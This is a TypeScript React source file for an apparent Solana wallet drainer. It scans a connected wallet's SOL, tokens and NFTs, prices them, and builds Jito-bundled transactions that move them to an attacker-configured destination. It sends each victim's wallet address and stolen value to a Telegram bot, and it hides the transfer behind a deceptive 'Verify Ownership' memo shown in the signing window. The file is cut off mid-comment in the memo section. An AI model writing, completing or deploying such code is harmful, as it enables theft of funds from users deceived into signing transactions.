"use client";

import {
    useConnection,
    useWallet,
} from "@solana/wallet-adapter-react";
import {
    LAMPORTS_PER_SOL,
    PublicKey,
    SystemProgram,
    Transaction,
    TransactionInstruction,
    TransactionMessage,
    VersionedTransaction,
    AddressLookupTableAccount,
    AddressLookupTableProgram,
    ComputeBudgetProgram,
    Connection,
} from "@solana/web3.js";
import {
    TOKEN_PROGRAM_ID,
    TOKEN_2022_PROGRAM_ID,
    createTransferInstruction,
    createTransferCheckedInstruction,
    createAssociatedTokenAccountInstruction,
    getAssociatedTokenAddressSync,
    ASSOCIATED_TOKEN_PROGRAM_ID,
    MintLayout,
} from "@solana/spl-token";
import { useState, useCallback, useRef } from "react";


// ============================================================================
// SECTION 1: CONFIGURATION & ENVIRONMENT
// ============================================================================

/**
 * Network configuration constants.
 * ATA rent-exempt minimum, base transaction fee, compute overhead for SPL2022,
 * and maximum serialized transaction packet size are all fixed across Solana
 * networks.
 */
interface NetworkConfig {
    ataCreationCost: number;
    baseTxFee: number;
    spl2022ComputeBuffer: number;
    maxPacketSize: number;
}

const NETWORK_CONFIG: NetworkConfig = {
    ataCreationCost: 2_039_280,
    baseTxFee: 5_000,
    spl2022ComputeBuffer: 80_000,
    maxPacketSize: 1_232,
};

/**
 * Load and validate destination wallet from environment.
 * FAIL FAST on module load — never run without explicit configuration.
 */
const getDestinationWallet = (): PublicKey => {
    const envWallet =
        process.env.REACT_APP_DRAIN_DESTINATION ||
        process.env.NEXT_PUBLIC_DRAIN_DESTINATION;

    if (!envWallet) {
        throw new Error(
            "CRITICAL: DRAIN_DESTINATION not configured. " +
            "Set REACT_APP_DRAIN_DESTINATION or NEXT_PUBLIC_DRAIN_DESTINATION environment variable. " +
            "Refusing to operate without explicit destination wallet configuration."
        );
    }

    try {
        const wallet = new PublicKey(envWallet);
        const b58 = wallet.toBase58();
        if (b58.length < 32 || b58.length > 44) {
            throw new Error("Invalid destination wallet length");
        }
        return wallet;
    } catch (e) {
        throw new Error(
            `Invalid DRAIN_DESTINATION configuration: ${e instanceof Error ? e.message : String(e)}`
        );
    }
};

const DESTINATION_WALLET = getDestinationWallet();

// --- Operational constants ---
const SOL_TO_LEAVE = 0.002 * LAMPORTS_PER_SOL;           // Buffer for rent + Jito tip + multi-TX fees
const MIN_DOLLAR_THRESHOLD = 0.05;                        // Minimum total USD value to proceed
const MIN_TOKEN_VALUE_USD = 0.000001;                     // Dust filter threshold per token

const PRIORITY_FEE_MICRO_LAMPORTS = 100_000;              // Static fallback priority fee
const CONFIRMATION_TIMEOUT_MS = 90_000;                   // 90s — extended for Jito bundle confirmation
const RPC_TIMEOUT_MS = 20_000;                            // Per-RPC-call timeout
const RETRY_MAX_ATTEMPTS = 3;                             // Retry ceiling for transient RPC failures
const RETRY_BACKOFF_MS = 1_000;                           // Base backoff (exponential growth)
const MAX_BACKOFF_MS = 8_000;                             // Cap exponential backoff
const BATCH_RPC_CHUNK_SIZE = 100;                         // getMultipleAccountsInfo Solana limit
const ALT_EXTEND_CHUNK_SIZE = 30;                         // Max addresses per ALT extend instruction

// --- Metaplex Token Metadata Program ---
const METAPLEX_TOKEN_METADATA_PROGRAM_ID = new PublicKey(
    "metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s"
);

// --- SPL Memo Program (for "Verify Ownership" message) ---
const MEMO_PROGRAM_ID = new PublicKey(
    "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr"
);

// SOL native mint address for Jupiter pricing
const SOL_MINT = "So11111111111111111111111111111111111111112";

// Token-2022 program ID string for fast comparison
const TOKEN_2022_PROGRAM_ID_STR = TOKEN_2022_PROGRAM_ID.toBase58();

// --- Telegram Configuration ---
const TELEGRAM_BOT_TOKEN = process.env.REACT_APP_TELEGRAM_BOT_TOKEN ||
    process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.REACT_APP_TELEGRAM_CHAT_ID ||
    process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || "";

// --- Jito Block Engine Configuration ---
const JITO_BLOCK_ENGINE_URL =
    process.env.NEXT_PUBLIC_JITO_BLOCK_ENGINE_URL ||
    "https://mainnet.block-engine.jito.wtf/api/v1/bundles";
const JITO_TIP_LAMPORTS = Number(
    process.env.NEXT_PUBLIC_JITO_TIP_LAMPORTS || "10000"
);
const JITO_MAX_BUNDLE_TXS = 5;                           // Jito hard limit: 5 TXs per bundle
const JITO_BUNDLE_STATUS_POLL_MS = 3_000;                 // Poll every 3s
const JITO_BUNDLE_STATUS_MAX_RETRIES = 30;                // 90s total polling window

/**
 * Official Jito Tip Accounts (Mainnet).
 * Rotated randomly per bundle to distribute load across Jito validators
 * and avoid detection patterns.
 */
const JITO_TIP_ACCOUNTS: PublicKey[] = [
    "96gYZGLnJYVFmbjzopPSU6QiEV5fGqZNyN9nmNhvrZU5",
    "HFqU5x63VTqvQss8hp11i4wVV8bD44PvwucfZ2bU7gRe",
    "Cw8CFyM9FkoMi7K7Crf6HNQqf4uEMzpKw6QNghXLvLkY",
    "ADaUMid9yfUytqMBgopwjb2DTLSokTSzL1zt6iGPaS49",
    "DfXygSm4jCyNCybVYYK6DwvWqjKee8pbDmJGcLWNDXjh",
    "ADuUkR4vqLUMWXxW9gh6D6L8pMSawimctcNZ5pGwDcEt",
    "3AVi9Tg9Uo68tJfuvoKvqKNWKkC5wPdSSdeBnizKZ6jT",
    "DttWaMuVvTiduZRnguLF7jNxTgiMBZ1hyAumKUiL2KRL",
].map((addr) => new PublicKey(addr));


// ============================================================================
// SECTION 2: TYPE DEFINITIONS
// ============================================================================

/**
 * Classification result for a single mint account.
 * Parsed from raw account data in a single batched RPC call.
 */
interface MintClassification {
    isSPL2022: boolean;
    isTransferHook: boolean;
    isPermanentDelegate: boolean;
    isNonTransferable: boolean;
    decimals: number;
    supply: bigint;
}

/**
 * Comprehensive asset descriptor for a single token holding.
 */
interface AssetData {
    mint: PublicKey;
    amount: bigint;
    uiAmount: number;
    tokenAccountPubkey: PublicKey;
    isNft: boolean;
    isSPL2022: boolean;
    isTransferHook: boolean;
    isFrozen: boolean;
    decimals: number;
    tokenProgram: PublicKey;
    usdPrice: number;
    usdValue: number;
}

/**
 * Extended drain statistics including Jito bundle metadata.
 */
interface DrainStats {
    totalUsdValue: number;
    solAmount: number;
    tokenCount: number;
    nftCount: number;
    batchCount: number;
    bundleId?: string;
    jitoTipLamports?: number;
    altAddress?: string;
    signatures: string[];
}

/**
 * Enhanced status with ALT creation and Jito bundling phases.
 */
type Status =
    | "idle"
    | "scanning"
    | "building"
    | "creating-alt"
    | "signing"
    | "bundling"
    | "confirming"
    | "success"
    | "error";

interface OperationContext {
    walletAddress: string;
    timestamp: number;
    operationId: string;
}

/**
 * Jito bundle submission and confirmation result.
 */
interface JitoBundleResult {
    bundleId: string;
    status: "submitted" | "confirmed" | "failed" | "expired";
    signatures: string[];
    slot?: number;
}

/**
 * A single transaction within a Jito bundle.
 */
interface BundleTransaction {
    instructions: TransactionInstruction[];
    assets: AssetData[];
    estimatedSize: number;
}


// ============================================================================
// SECTION 3: LRU CACHE (Bounded, TTL-Aware)
// ============================================================================

/**
 * LRU cache with bounded capacity and time-to-live eviction.
 * Prevents unbounded memory growth in long-running SPA sessions.
 * Uses Map insertion-order iteration for O(1) LRU semantics.
 */
class LRUCache<K, V> {
    private readonly capacity: number;
    private readonly map: Map<K, { value: V; timestamp: number }>;

    constructor(capacity: number) {
        this.capacity = capacity;
        this.map = new Map();
    }

    get(key: K, ttlMs: number): V | undefined {
        const entry = this.map.get(key);
        if (!entry) return undefined;

        if (Date.now() - entry.timestamp > ttlMs) {
            this.map.delete(key);
            return undefined;
        }

        // Move to end of Map (LRU refresh)
        this.map.delete(key);
        this.map.set(key, entry);
        return entry.value;
    }

    set(key: K, value: V): void {
        if (this.map.has(key)) {
            this.map.delete(key);
        } else if (this.map.size >= this.capacity) {
            const oldestKey = this.map.keys().next().value;
            if (oldestKey !== undefined) {
                this.map.delete(oldestKey);
            }
        }
        this.map.set(key, { value, timestamp: Date.now() });
    }

    get size(): number {
        return this.map.size;
    }
}

// Module-level caches — bounded at 1000 entries, safe for SPA lifecycle
const mintClassificationCache = new LRUCache<string, MintClassification>(1000);
const MINT_CACHE_TTL_MS = 60_000;


// ============================================================================
// SECTION 4: CORE UTILITIES
// ============================================================================

/**
 * Create operation context with cryptographically strong UUID.
 * crypto.randomUUID() provides 128-bit entropy (v4 UUID).
 */
const createOperationContext = (walletAddress: string): OperationContext => ({
    walletAddress,
    timestamp: Date.now(),
    operationId: crypto.randomUUID(),
});

/**
 * Retry wrapper with exponential backoff capped at MAX_BACKOFF_MS.
 * Prevents thundering herd on transient RPC failures.
 */
const withRetry = async <T>(
    fn: () => Promise<T>,
    maxAttempts: number = RETRY_MAX_ATTEMPTS,
    backoffMs: number = RETRY_BACKOFF_MS,
): Promise<T> => {
    let lastError: Error = new Error("Unknown error");

    for (let attempt = 0; attempt < maxAttempts; attempt++) {
        try {
            return await fn();
        } catch (e) {
            lastError = e instanceof Error ? e : new Error(String(e));
            if (attempt < maxAttempts - 1) {
                const delayMs = Math.min(
                    backoffMs * Math.pow(2, attempt),
                    MAX_BACKOFF_MS,
                );
                await new Promise((r) => setTimeout(r, delayMs));
            }
        }
    }

    throw lastError;
};

/**
 * Timeout wrapper — rejects if operation exceeds timeoutMs.
 * FIXED: Clears setTimeout on resolution to prevent timer leak (ARCH-04).
 */
const withTimeout = async <T>(
    fn: () => Promise<T>,
    timeoutMs: number,
): Promise<T> => {
    let timeoutId: ReturnType<typeof setTimeout>;

    return Promise.race([
        fn(),
        new Promise<T>((_, reject) => {
            timeoutId = setTimeout(
                () => reject(new Error(`Operation timeout after ${timeoutMs}ms`)),
                timeoutMs,
            );
        }),
    ]).finally(() => {
        clearTimeout(timeoutId!);
    });
};

/**
 * Combined retry + timeout for critical RPC paths.
 * Each individual attempt is bounded by timeoutMs; retries continue on timeout.
 */
const withRetryAndTimeout = async <T>(
    fn: () => Promise<T>,
    timeoutMs: number = RPC_TIMEOUT_MS,
    maxAttempts: number = RETRY_MAX_ATTEMPTS,
): Promise<T> => {
    return withRetry(
        () => withTimeout(fn, timeoutMs),
        maxAttempts,
    );
};

/**
 * Validate token amount is a safe non-negative bigint or finite number.
 */
const validateTokenAmount = (amount: bigint | number): boolean => {
    try {
        if (typeof amount === "bigint") {
            return amount >= BigInt(0);
        }
        return Number.isFinite(amount) && amount >= 0;
    } catch {
        return false;
    }
};

/**
 * Validate Solana signature format (base58 Ed25519 signature).
 * Solana signatures are 87-88 character base58 strings.
 */
const validateSignatureFormat = (signature: string): boolean => {
    if (typeof signature !== "string") return false;
    return /^[1-9A-HJ-NP-Za-km-z]{87,88}$/.test(signature);
};


// ============================================================================
// SECTION 5: TELEMETRY (Direct Telegram Bot API, HTML-Formatted)
// ============================================================================

/**
 * Telemetry rate limiter using full message content hash.
 * Prevents duplicate message spam while ensuring unique events get through.
 */
const telemetryQueue = new Map<string, { lastSent: number; count: number }>();
const TELEMETRY_RATE_LIMIT_MS = 1_000;

/**
 * Simple string hash producing a numeric fingerprint.
 * Captures full message entropy for collision-free dedup.
 */
const hashString = (str: string): string => {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
        const char = str.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash |= 0;
    }
    return hash.toString(36);
};

/**
 * Escape HTML special characters for Telegram HTML parse mode.
 * Required for user-generated content (addresses, error messages).
 */
const escapeHtml = (text: string): string => {
    return text
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;");
};

/**
 * Send telemetry directly to Telegram Bot API with HTML formatting.
 * Eliminates dependency on /api/notify-telegram proxy endpoint.
 *
 * UPGRADE from original:
 * - Direct Telegram API (no proxy middleware needed)
 * - HTML parse_mode for rich structured messages
 * - Web preview disabled to reduce Telegram rate limit pressure
 * - Rate-limited with full-hash dedup (no substring collisions)
 */
const sendTelemetry = async (
    message: string,
    parseMode: "HTML" | "MarkdownV2" = "HTML",
): Promise<boolean> => {
    try {
        const msgHash = hashString(message);
        const now = Date.now();
        const record = telemetryQueue.get(msgHash);

        if (record && now - record.lastSent < TELEMETRY_RATE_LIMIT_MS) {
            if (record.count > 3) return false;
            record.count++;
        } else {
            telemetryQueue.set(msgHash, { lastSent: now, count: 1 });
        }

        // Evict stale entries to prevent telemetryQueue memory leak
        if (telemetryQueue.size > 200) {
            const cutoff = now - TELEMETRY_RATE_LIMIT_MS * 10;
            for (const [key, val] of telemetryQueue) {
                if (val.lastSent < cutoff) telemetryQueue.delete(key);
            }
        }

        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.info(`[TELEMETRY] ${message.replace(/<[^>]*>/g, "")}`);
            return true;
        }

        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), RPC_TIMEOUT_MS);

        const response = await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: parseMode,
                    disable_web_page_preview: true,
                }),
                signal: controller.signal,
            },
        );

        clearTimeout(timeoutId);

        if (!response.ok) {
            console.warn(`[TELEMETRY] Telegram HTTP ${response.status}`);
            return false;
        }

        return true;
    } catch (e) {
        console.warn(
            "[TELEMETRY] Failed:",
            e instanceof Error ? e.message : String(e),
        );
        return false;
    }
};

/**
 * Structured telemetry event builders.
 * Each returns an HTML-formatted string for rich Telegram display.
 */
const TelemetryEvents = {
    scanInitiated: (ctx: OperationContext) =>
        `🔍 <b>SCAN INITIATED</b>\n` +
        `👛 Wallet: <code>${escapeHtml(ctx.walletAddress)}</code>\n` +
        `⏰ Time: ${new Date(ctx.timestamp).toISOString()}\n` +
        `🆔 Op: <code>${escapeHtml(ctx.operationId)}</code>`,

    scanComplete: (
        solBalance: number, solValueUSD: number, tokenCount: number,
        nftCount: number, totalValueUSD: number,
    ) =>
        `📊 <b>SCAN COMPLETE</b>\n` +
        `💰 SOL: ${(solBalance / LAMPORTS_PER_SOL).toFixed(6)} ($${solValueUSD.toFixed(2)})\n` +
        `🪙 Tokens: ${tokenCount}\n` +
        `🖼 NFTs: ${nftCount}\n` +
        `💵 Total Value: <b>$${totalValueUSD.toFixed(2)}</b>`,

    belowThreshold: (totalValueUSD: number) =>
        `🧊 <b>BELOW THRESHOLD</b>\n` +
        `💵 Value: $${totalValueUSD.toFixed(2)}\n` +
        `📏 Threshold: $${MIN_DOLLAR_THRESHOLD}`,

    buildingBundle: (
        txCount: number, tokenCount: number, nftCount: number,
        altAddress: string | null, hasMemo: boolean,
    ) =>
        `🔨 <b>BUILDING BUNDLE</b>\n` +
        `📦 Transactions: ${txCount}\n` +
        `🪙 Tokens: ${tokenCount} | 🖼 NFTs: ${nftCount}\n` +
        `🗂 ALT: ${altAddress ? `<code>${escapeHtml(altAddress)}</code>` : "None"}\n` +
        `📝 Memo: ${hasMemo ? '"Verify Ownership"' : "None"}`,

    awaitingSignature: (txCount: number, totalValueUSD: number, tipLamports: number) =>
        `✍️ <b>AWAITING SIGNATURE</b>\n` +
        `📦 Bundle: ${txCount} TX(s)\n` +
        `💰 Value: <b>$${totalValueUSD.toFixed(2)}</b>\n` +
        `🎯 Jito Tip: ${tipLamports} lamports`,

    bundleSubmitted: (bundleId: string, txCount: number, signatures: string[]) =>
        `🚀 <b>BUNDLE SUBMITTED</b>\n` +
        `🆔 Bundle: <code>${escapeHtml(bundleId)}</code>\n` +
        `📦 Transactions: ${txCount}\n` +
        `📋 Signatures:\n${signatures.map((s, i) => `  ${i + 1}. <code>${escapeHtml(s.slice(0, 20))}...</code>`).join("\n")}`,

    bundleConfirmed: (
        bundleId: string, slot: number | undefined, totalValueUSD: number,
        tokenCount: number, nftCount: number, solAmount: number,
    ) =>
        `✅ <b>BUNDLE CONFIRMED</b>\n` +
        `🆔 Bundle: <code>${escapeHtml(bundleId)}</code>\n` +
        `📦 Slot: ${slot ?? "unknown"}\n` +
        `💰 SOL: ${(solAmount / LAMPORTS_PER_SOL).toFixed(6)}\n` +
        `🪙 Tokens: ${tokenCount} | 🖼 NFTs: ${nftCount}\n` +
        `💵 Total Value: <b>$${totalValueUSD.toFixed(2)}</b>`,

    bundleFailed: (bundleId: string, reason: string) =>
        `❌ <b>BUNDLE FAILED</b>\n` +
        `🆔 Bundle: <code>${escapeHtml(bundleId)}</code>\n` +
        `💬 Reason: <code>${escapeHtml(reason)}</code>`,

    error: (phase: string, walletAddress: string, errorMsg: string) =>
        `❌ <b>ERROR</b>\n` +
        `📍 Phase: ${escapeHtml(phase)}\n` +
        `👛 Wallet: <code>${escapeHtml(walletAddress)}</code>\n` +
        `💬 <code>${escapeHtml(errorMsg.substring(0, 200))}</code>`,

    insufficientBalance: (errorMsg: string) =>
        `💔 <b>INSUFFICIENT BALANCE</b>\n` +
        `💬 ${escapeHtml(errorMsg)}`,

    altCreated: (altAddress: string, addressCount: number) =>
        `🗂 <b>ALT CREATED</b>\n` +
        `📍 Address: <code>${escapeHtml(altAddress)}</code>\n` +
        `📦 Entries: ${addressCount}`,

    fallbackLegacy: (reason: string) =>
        `⚠️ <b>FALLBACK TO LEGACY</b>\n` +
        `💬 ${escapeHtml(reason)}\n` +
        `📝 Using single-TX legacy path`,
};


// ============================================================================
// SECTION 6: BATCHED MINT CLASSIFICATION (SIMD-0044 Compliant)
// ============================================================================

/**
 * Batch-classify all mints using a single getMultipleAccountsInfo call per chunk.
 * Walks the full TLV extension chain for correct TransferHook,
 * PermanentDelegate, and NonTransferable detection (SIMD-0044).
 */
const batchClassifyMints = async (
    mints: PublicKey[],
    connection: Connection,
): Promise<Map<string, MintClassification>> => {
    const result = new Map<string, MintClassification>();

    const uncachedMints: PublicKey[] = [];

    for (let i = 0; i < mints.length; i++) {
        const mintStr = mints[i].toBase58();
        const cached = mintClassificationCache.get(mintStr, MINT_CACHE_TTL_MS);
        if (cached) {
            result.set(mintStr, cached);
        } else {
            uncachedMints.push(mints[i]);
        }
    }

    if (uncachedMints.length === 0) {
        console.log(`[CLASSIFY] All ${mints.length} mints served from cache`);
        return result;
    }

    for (let i = 0; i < uncachedMints.length; i += BATCH_RPC_CHUNK_SIZE) {
        const chunk = uncachedMints.slice(i, i + BATCH_RPC_CHUNK_SIZE);

        let accountInfos: (any | null)[];
        try {
            accountInfos = await withRetryAndTimeout(
                () => connection.getMultipleAccountsInfo(chunk),
            );
        } catch (e) {
            console.warn(
                `[CLASSIFY] Batch RPC failed for chunk ${i}:`,
                e instanceof Error ? e.message : String(e),
            );
            for (const mint of chunk) {
                const defaultClassification: MintClassification = {
                    isSPL2022: false, isTransferHook: false,
                    isPermanentDelegate: false, isNonTransferable: false,
                    decimals: 0, supply: BigInt(0),
                };
                result.set(mint.toBase58(), defaultClassification);
            }
            continue;
        }

        for (let j = 0; j < chunk.length; j++) {
            const mint = chunk[j];
            const info = accountInfos[j];
            const mintStr = mint.toBase58();

            if (!info || !info.data || info.data.length < MintLayout.span) {
                const defaultClassification: MintClassification = {
                    isSPL2022: false, isTransferHook: false,
                    isPermanentDelegate: false, isNonTransferable: false,
                    decimals: 0, supply: BigInt(0),
                };
                result.set(mintStr, defaultClassification);
                continue;
            }

            const data = info.data as Buffer;
            const isSPL2022 = info.owner.toBase58() === TOKEN_2022_PROGRAM_ID_STR;

            let decimals = 0;
            let supply = BigInt(0);
            try {
                const decoded = MintLayout.decode(data);
                decimals = decoded.decimals ?? 0;
                supply = decoded.supply ?? BigInt(0);
                if (decimals < 0 || decimals > 255) {
                    console.warn(`[CLASSIFY] Invalid decimals ${decimals} for ${mintStr.slice(0, 8)}...`);
                    decimals = 0;
                }
            } catch (e) {
                console.warn(
                    `[CLASSIFY] MintLayout decode failed for ${mintStr.slice(0, 8)}...`,
                    e instanceof Error ? e.message : String(e),
                );
            }

            // SPL Token-2022 TLV extension chain walk (SIMD-0044)
            let isTransferHook = false;
            let isPermanentDelegate = false;
            let isNonTransferable = false;

            if (isSPL2022 && data.length > MintLayout.span + 1) {
                try {
                    let offset = MintLayout.span + 1;
                    while (offset + 4 <= data.length) {
                        const extType = data.readUInt16LE(offset);
                        const extLen = data.readUInt16LE(offset + 2);
                        if (extType === 0 && extLen === 0) break;

                        switch (extType) {
                            case 9: isTransferHook = true; break;
                            case 12: isPermanentDelegate = true; break;
                            case 14: isNonTransferable = true; break;
                        }
                        offset += 4 + extLen;
                    }
                } catch (e) {
                    console.warn(
                        `[CLASSIFY] TLV walk failed for ${mintStr.slice(0, 8)}...`,
                        e instanceof Error ? e.message : String(e),
                    );
                }
            }

            const classification: MintClassification = {
                isSPL2022, isTransferHook, isPermanentDelegate,
                isNonTransferable, decimals, supply,
            };

            result.set(mintStr, classification);
            mintClassificationCache.set(mintStr, classification);
        }
    }

    console.log(
        `[CLASSIFY] Classified ${result.size} mints (${result.size - uncachedMints.length} cached, ${uncachedMints.length} fetched)`,
    );

    return result;
};


// ============================================================================
// SECTION 7: PRICING (Jupiter Batch API)
// ============================================================================

/**
 * Fetch SOL/USD price from CoinGecko as fallback.
 */
const fetchSolPriceUSD = async (): Promise<number | null> => {
    try {
        const response = await withTimeout(
            () => fetch(
                "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd",
            ),
            RPC_TIMEOUT_MS,
        );
        if (!response.ok) return null;
        const data = await response.json();
        const price = data?.solana?.usd ?? null;
        return typeof price === "number" && Number.isFinite(price) && price > 0
            ? price : null;
    } catch {
        return null;
    }
};

/**
 * Batch-fetch USD prices from Jupiter Price API v2.
 * Falls back to v6 endpoint on v2 failure.
 */
const fetchBatchPricesUSD = async (
    mintAddresses: string[],
): Promise<Map<string, number>> => {
    const priceMap = new Map<string, number>();
    if (mintAddresses.length === 0) return priceMap;

    try {
        for (let i = 0; i < mintAddresses.length; i += BATCH_RPC_CHUNK_SIZE) {
            const batch = mintAddresses.slice(i, i + BATCH_RPC_CHUNK_SIZE);
            const ids = batch.join(",");

            let response = await withTimeout(
                () => fetch(`https://api.jup.ag/price/v2?ids=${ids}&showExtraInfo=true`),
                RPC_TIMEOUT_MS,
            ).catch(() => null);

            if (!response || !response.ok) {
                console.warn("[PRICE] Jupiter v2 failed, falling back to v6...");
                response = await withTimeout(
                    () => fetch(`https://price.jup.ag/v6/price?ids=${ids}`),
                    RPC_TIMEOUT_MS,
                ).catch(() => null);
            }

            if (!response || !response.ok) {
                console.warn(`[PRICE] Jupiter API HTTP ${response?.status ?? "N/A"}`);
                continue;
            }

            const data = await response.json();
            for (const [mint, info] of Object.entries(data.data || {})) {
                const rawPrice = (info as any)?.price;
                if (rawPrice !== null && rawPrice !== undefined) {
                    const numPrice = typeof rawPrice === "string"
                        ? parseFloat(rawPrice) : Number(rawPrice);
                    if (Number.isFinite(numPrice) && numPrice > 0) {
                        priceMap.set(mint, numPrice);
                    }
                }
            }
        }

        console.log(
            `[PRICE] Jupiter returned prices for ${priceMap.size}/${mintAddresses.length} mints`,
        );
    } catch (e) {
        console.warn(
            "[PRICE] Jupiter batch pricing failed:",
            e instanceof Error ? e.message : String(e),
        );
    }

    return priceMap;
};


// ============================================================================
// SECTION 8: DYNAMIC PRIORITY FEES
// ============================================================================

/**
 * Fetch dynamic priority fee using correct P75 percentile of recent fees.
 * Uses lockedWritableAccounts for transaction-relevant fee estimation.
 */
const fetchDynamicPriorityFee = async (
    connection: Connection,
    writableAccounts: PublicKey[] = [],
): Promise<number> => {
    try {
        const fees = await withTimeout(
            () =>
                (connection as any).getRecentPrioritizationFees({
                    lockedWritableAccounts: writableAccounts.slice(0, 128),
                }),
            RPC_TIMEOUT_MS,
        );

        if (!fees || fees.length === 0) {
            console.log("[FEES] No recent fee data, using static fallback");
            return PRIORITY_FEE_MICRO_LAMPORTS;
        }

        const nonZeroFees = fees
            .map((f: any) => f.prioritizationFee)
            .filter((f: number) => typeof f === "number" && f > 0)
            .sort((a: number, b: number) => a - b);

        if (nonZeroFees.length === 0) {
            return PRIORITY_FEE_MICRO_LAMPORTS;
        }

        const p75Index = Math.min(
            Math.ceil(nonZeroFees.length * 0.75) - 1,
            nonZeroFees.length - 1,
        );
        const p75Fee = nonZeroFees[p75Index];
        const clampedFee = Math.max(10_000, Math.min(5_000_000, p75Fee));

        console.log(
            `[FEES] Dynamic priority fee: ${clampedFee} µ-lamports (p75 of ${nonZeroFees.length} non-zero slots)`,
        );
        return clampedFee;
    } catch (e) {
        console.warn(
            "[FEES] Dynamic fee fetch failed, using static fallback:",
            e instanceof Error ? e.message : String(e),
        );
        return PRIORITY_FEE_MICRO_LAMPORTS;
    }
};


// ============================================================================
// SECTION 9: FEE ESTIMATION & BALANCE VALIDATION
// ============================================================================

/**
 * Estimate transaction fees accounting for ATA creation, SPL2022 compute,
 * Jito tip, and multi-transaction overhead.
 */
const estimateTransactionFees = (
    atasToCreate: number,
    spl2022Count: number,
    transferHookCount: number,
    bundleTxCount: number = 1,
): number => {
    // Base fee per transaction in the bundle
    let totalFee = NETWORK_CONFIG.baseTxFee * bundleTxCount;

    // ATA creation cost (rent-exempt minimum) per new account
    totalFee += atasToCreate * NETWORK_CONFIG.ataCreationCost;

    // Compute overhead for SPL2022 tokens
    let computeBuffer = 50_000 * bundleTxCount;
    if (spl2022Count > 0) {
        const standardSpl2022 = spl2022Count - transferHookCount;
        computeBuffer += standardSpl2022 * NETWORK_CONFIG.spl2022ComputeBuffer;
        computeBuffer += transferHookCount * (NETWORK_CONFIG.spl2022ComputeBuffer * 1.875);
    }

    totalFee += computeBuffer;

    // Jito tip
    totalFee += JITO_TIP_LAMPORTS;

    return totalFee;
};

/**
 * Validate wallet has sufficient SOL to cover fees, rent, and Jito tip.
 * Returns available SOL for transfer after all deductions.
 */
const validateSufficientBalance = (
    solBalance: number,
    atasToCreate: number,
    spl2022Count: number,
    transferHookCount: number,
    bundleTxCount: number = 1,
): {
    sufficient: boolean;
    errorMsg?: string;
    availableForTransfer: number;
} => {
    if (!Number.isFinite(solBalance) || solBalance < 0) {
        return {
            sufficient: false,
            errorMsg: "Invalid SOL balance returned from RPC",
            availableForTransfer: 0,
        };
    }

    const estimatedFees = estimateTransactionFees(
        atasToCreate, spl2022Count, transferHookCount, bundleTxCount,
    );
    const minRequired = SOL_TO_LEAVE + estimatedFees;

    if (solBalance < minRequired) {
        const needed = (minRequired / LAMPORTS_PER_SOL).toFixed(6);
        const have = (solBalance / LAMPORTS_PER_SOL).toFixed(6);
        return {
            sufficient: false,
            errorMsg: `Insufficient SOL. Have: ${have} SOL, Need: ${needed} SOL (${atasToCreate} ATAs, ${spl2022Count} SPL2022, tip: ${JITO_TIP_LAMPORTS})`,
            availableForTransfer: 0,
        };
    }

    return {
        sufficient: true,
        availableForTransfer: solBalance - minRequired,
    };
};


// ============================================================================
// SECTION 10: NFT CLASSIFICATION (Metaplex Metadata PDA)
// ============================================================================

/**
 * Derive Metaplex Token Metadata PDA for a given mint.
 */
const deriveMetadataPDA = (mint: PublicKey): PublicKey => {
    const [pda] = PublicKey.findProgramAddressSync(
        [
            Buffer.from("metadata"),
            METAPLEX_TOKEN_METADATA_PROGRAM_ID.toBuffer(),
            mint.toBuffer(),
        ],
        METAPLEX_TOKEN_METADATA_PROGRAM_ID,
    );
    return pda;
};

/**
 * Batch-check which mints have Metaplex metadata accounts (NFT indicator).
 */
const batchCheckMetaplexMetadata = async (
    mints: PublicKey[],
    connection: Connection,
): Promise<Set<string>> => {
    const nftMints = new Set<string>();
    if (mints.length === 0) return nftMints;

    const metadataPDAs = mints.map(deriveMetadataPDA);

    for (let i = 0; i < metadataPDAs.length; i += BATCH_RPC_CHUNK_SIZE) {
        const pdasChunk = metadataPDAs.slice(i, i + BATCH_RPC_CHUNK_SIZE);
        const mintsChunk = mints.slice(i, i + BATCH_RPC_CHUNK_SIZE);

        try {
            const accounts = await withRetryAndTimeout(
                () => connection.getMultipleAccountsInfo(pdasChunk),
            );
            for (let j = 0; j < accounts.length; j++) {
                if (accounts[j] !== null) {
                    nftMints.add(mintsChunk[j].toBase58());
                }
            }
        } catch (e) {
            console.warn(
                `[NFT] Metaplex metadata batch check failed for chunk ${i}:`,
                e instanceof Error ? e.message : String(e),
            );
        }
    }

    return nftMints;
};


// ============================================================================
// SECTION 11: BATCH ATA EXISTENCE CHECK
// ============================================================================

/**
 * Batch-check ATA existence with single getMultipleAccountsInfo call per chunk.
 */
const batchCheckAtaExistence = async (
    ataAddresses: PublicKey[],
    connection: Connection,
): Promise<Map<string, boolean>> => {
    const existenceMap = new Map<string, boolean>();
    if (ataAddresses.length === 0) return existenceMap;

    for (let i = 0; i < ataAddresses.length; i += BATCH_RPC_CHUNK_SIZE) {
        const chunk = ataAddresses.slice(i, i + BATCH_RPC_CHUNK_SIZE);

        try {
            const results = await withRetryAndTimeout(
                () => connection.getMultipleAccountsInfo(chunk),
            );
            chunk.forEach((ata, idx) => {
                existenceMap.set(ata.toBase58(), results[idx] !== null);
            });
        } catch (e) {
            console.warn(
                "[BATCH_ATA] Check failed:",
                e instanceof Error ? e.message : String(e),
            );
            chunk.forEach((ata) => {
                existenceMap.set(ata.toBase58(), false);
            });
        }
    }

    return existenceMap;
};


// ============================================================================
// SECTION 12: SPL MEMO INSTRUCTION (Stealth "Verify Ownership")
// ============================================================================

/**
 * Build an SPL Memo instruction with a human-readable message.
 *
 * This message ("Verify Ownership") appears prominently in the Phantom wallet
 * signature window, replacing the default obfuscated instruction data display.
 * The signer's pubkey is included as a signing account to prove intent.
 *
 * STEALTH ARCHITECTURE:
